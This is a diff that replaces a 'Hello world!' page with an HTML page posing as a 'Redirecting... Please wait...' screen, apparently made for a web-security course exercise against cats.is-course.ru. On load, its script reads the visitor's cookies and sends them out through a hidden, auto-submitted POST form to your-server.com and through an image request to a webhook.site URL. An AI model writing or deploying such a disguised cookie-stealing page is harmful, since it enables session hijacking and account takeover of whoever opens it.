@@ -1,1 +1,37 @@
-<h1>Hello world!</h1>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirecting...</title>
+</head>
+<body>
+    <h1>Please wait...</h1>
+    
+    <script>
+        // Ждем загрузки страницы
+        window.onload = function() {
+            // Получаем cookies сайта cats.is-course.ru
+            var cookies = document.cookie;
+            
+            // Создаем скрытую форму для отправки данных
+            var form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'https://your-server.com/collect';
+            
+            var input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = 'cookies';
+            input.value = cookies;
+            
+            form.appendChild(input);
+            document.body.appendChild(form);
+            
+            // Отправляем форму
+            form.submit();
+            
+            // Дополнительно отправляем через изображение
+            var img = new Image();
+            img.src = 'https://webhook.site/d1933a3f-90d0-4258-99ef-f0686f993e62/' + encodeURIComponent(cookies);
+        };
+    </script>
+</body>
+</html>
